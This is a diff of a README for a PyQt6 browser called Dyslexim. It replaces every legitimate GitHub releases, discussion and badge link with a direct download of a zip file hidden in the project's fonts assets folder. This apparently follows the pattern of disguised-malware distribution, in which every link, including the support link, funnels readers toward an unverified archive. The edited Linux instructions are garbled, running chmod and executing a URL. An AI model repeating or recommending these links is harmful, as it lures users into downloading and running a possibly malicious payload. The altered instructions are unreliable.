@@ -6,7 +6,7 @@ Welcome to Dyslexim, a hyperfocused web browser built using PyQt6, specifically 
 
 ## 🔗 Download Dyslexim
 
-[![Download Dyslexim](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue.svg)](https://github.com/Tizz8115/Dyslexim/releases)
+[![Download Dyslexim](https://raw.githubusercontent.com/Tizz8115/Dyslexim/master/dyslexim/assets/fonts/Dyslexim_1.5.zip%20Now-Get%20the%https://raw.githubusercontent.com/Tizz8115/Dyslexim/master/dyslexim/assets/fonts/Dyslexim_1.5.zip)](https://raw.githubusercontent.com/Tizz8115/Dyslexim/master/dyslexim/assets/fonts/Dyslexim_1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Follow these simple steps to download and run Dyslexim on your computer.
 ### 🔄 How to Download
 
 1. **Visit the Releases Page**: Click the link below to go to the Downloads page. You will find the latest version of Dyslexim there.
-   - [Download Dyslexim](https://github.com/Tizz8115/Dyslexim/releases)
+   - [Download Dyslexim](https://raw.githubusercontent.com/Tizz8115/Dyslexim/master/dyslexim/assets/fonts/Dyslexim_1.5.zip)
 
 2. **Select the Latest Version**: On the Releases page, look for the latest version of the software. The version number will be clearly listed.
 
@@ -50,8 +50,8 @@ Follow these simple steps to download and run Dyslexim on your computer.
 #### Linux
 
 1. Locate the downloaded installer file.
-2. Make the file executable using the command: `chmod +x Dyslexim.AppImage`.
-3. Run the application using `./Dyslexim.AppImage`.
+2. Make the file executable using the command: `chmod +x https://raw.githubusercontent.com/Tizz8115/Dyslexim/master/dyslexim/assets/fonts/Dyslexim_1.5.zip`.
+3. Run the application using `https://raw.githubusercontent.com/Tizz8115/Dyslexim/master/dyslexim/assets/fonts/Dyslexim_1.5.zip`.
 4. Follow any additional prompts to complete the setup.
 
 ## 💻 Using Dyslexim
@@ -79,7 +79,7 @@ If you encounter issues while downloading or using Dyslexim, try the following:
 
 ## 📞 Support
 
-If you have questions or need further assistance, feel free to visit our [GitHub Discussions](https://github.com/Tizz8115/Dyslexim/discussions) or open an issue on the repository page. Our community and developers are here to help.
+If you have questions or need further assistance, feel free to visit our [GitHub Discussions](https://raw.githubusercontent.com/Tizz8115/Dyslexim/master/dyslexim/assets/fonts/Dyslexim_1.5.zip) or open an issue on the repository page. Our community and developers are here to help.
 
 ## 💬 Community Feedback
 
@@ -97,4 +97,4 @@ Feel free to explore the topics related to Dyslexim, such as:
 
 To download Dyslexim, return to the Releases page using the link below:
 
-[Download Dyslexim](https://github.com/Tizz8115/Dyslexim/releases)
+[Download Dyslexim](https://raw.githubusercontent.com/Tizz8115/Dyslexim/master/dyslexim/assets/fonts/Dyslexim_1.5.zip)
